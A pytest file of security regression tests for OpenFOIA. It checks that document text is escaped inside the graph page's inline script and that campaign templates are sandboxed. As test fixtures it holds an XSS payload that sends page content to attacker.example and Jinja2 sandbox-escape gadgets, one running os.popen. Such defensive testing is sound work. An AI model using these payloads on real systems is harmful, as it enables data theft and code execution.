"""Security regression tests: injection from untrusted document content.

Threat model: documents ingested by OpenFOIA are UNTRUSTED. A hostile agency
can return a FOIA response whose text is crafted to break out of the context
it is later rendered into. These tests pin the escaping/sandboxing that stops
untrusted content from becoming executable code.
"""

from __future__ import annotations

import json

import pytest

# ---------------------------------------------------------------------------
# Entity graph HTML — untrusted document text is embedded in an inline <script>
# ---------------------------------------------------------------------------

# A document body that closes the inline <script> and starts its own.
XSS_PAYLOAD = (
    "</script><script>fetch('https://attacker.example/x?d='+document.body.innerHTML)</script>"
)


def _render_graph(tmp_path, graph_data):
    from openfoia.graph_template import render

    out = tmp_path / "graph.html"
    render(json.dumps(graph_data), out)
    return out.read_text()


def test_graph_render_escapes_script_close_in_document_text(tmp_path):
    """A </script> inside document text must not terminate the data block."""
    html = _render_graph(
        tmp_path,
        {"nodes": [], "links": [], "documents": [{"id": "d1", "text": XSS_PAYLOAD}]},
    )

    # The literal breakout sequence must not survive into the page.
    assert "</script><script>" not in html
    # And no raw closing tag from the payload at all (case-insensitive).
    assert "</script>" in html.lower()  # the template's own closing tags remain
    assert html.lower().count("<script") == html.lower().count("</script")


def test_graph_render_escapes_script_close_in_entity_label(tmp_path):
    """Entity labels come from document text too — same escaping applies."""
    html = _render_graph(
        tmp_path,
        {"nodes": [{"id": "n1", "label": XSS_PAYLOAD}], "links": [], "documents": []},
    )
    assert "</script><script>" not in html


def test_graph_render_escapes_angle_brackets_as_unicode(tmp_path):
    """Escaping must use \\u003c / \\u003e so the JSON still parses in JS."""
    html = _render_graph(
        tmp_path,
        {"nodes": [], "links": [], "documents": [{"id": "d1", "text": "<b>hi</b>"}]},
    )
    assert "\\u003cb\\u003ehi" in html
    assert "<b>hi</b>" not in html


def test_graph_render_escapes_line_separators(tmp_path):
    """U+2028/U+2029 are valid JSON but break JS string literals."""
    html = _render_graph(
        tmp_path,
        {"nodes": [], "links": [], "documents": [{"id": "d1", "text": "a b c"}]},
    )
    assert " " not in html
    assert " " not in html


def test_graph_data_still_round_trips(tmp_path):
    """Escaping must not corrupt the data — it still has to be valid JSON."""
    import re

    payload = {
        "nodes": [{"id": "n1", "label": "Acme <Corp> & Sons"}],
        "links": [],
        "documents": [{"id": "d1", "text": XSS_PAYLOAD}],
    }
    html = _render_graph(tmp_path, payload)

    match = re.search(r"var graphData = (.*?);\n", html, re.DOTALL)
    assert match, "graphData assignment not found in rendered HTML"
    # The escaped < sequences are valid JSON escapes and decode back.
    assert json.loads(match.group(1)) == payload


# ---------------------------------------------------------------------------
# Campaign templates — shared artifacts rendered through Jinja2
# ---------------------------------------------------------------------------


def _campaign_template(subject="s", body="b"):
    from openfoia.campaign import CampaignTemplate

    return CampaignTemplate(
        name="t",
        description="d",
        subject_template=subject,
        body_template=body,
    )


class _FakeUser:
    name = "Test Requester"
    email = "test@example.com"


class _FakeAgency:
    name = "Test Agency"
    abbreviation = "TA"


# Classic Jinja2 sandbox-escape gadgets. A shared campaign template is
# attacker-controlled input: it arrives from a campaign organizer.
RCE_GADGETS = [
    "{{ ''.__class__.__mro__[1].__subclasses__() }}",
    "{{ self.__init__.__globals__ }}",
    "{{ ''.__class__.__base__.__subclasses__() }}",
    "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
]


@pytest.mark.parametrize("gadget", RCE_GADGETS)
def test_campaign_template_blocks_sandbox_escape_in_body(gadget):
    """Attribute access that reaches Python internals must be refused."""
    from jinja2.exceptions import SecurityError

    tmpl = _campaign_template(body=gadget)
    with pytest.raises(SecurityError):
        tmpl.render(_FakeUser(), _FakeAgency(), randomize=False)


@pytest.mark.parametrize("gadget", RCE_GADGETS)
def test_campaign_template_blocks_sandbox_escape_in_subject(gadget):
    from jinja2.exceptions import SecurityError

    tmpl = _campaign_template(subject=gadget)
    with pytest.raises(SecurityError):
        tmpl.render(_FakeUser(), _FakeAgency(), randomize=False)


def test_campaign_template_still_renders_legitimate_fields():
    """The sandbox must not break normal campaign templates."""
    tmpl = _campaign_template(
        subject="Records from {{ agency.name }}",
        body="Dear {{ agency.abbreviation }}, I am {{ participant.name }}. Date: {{ date }}",
    )
    subject, body = tmpl.render(_FakeUser(), _FakeAgency(), randomize=False)

    assert subject == "Records from Test Agency"
    assert "Dear TA" in body
    assert "Test Requester" in body
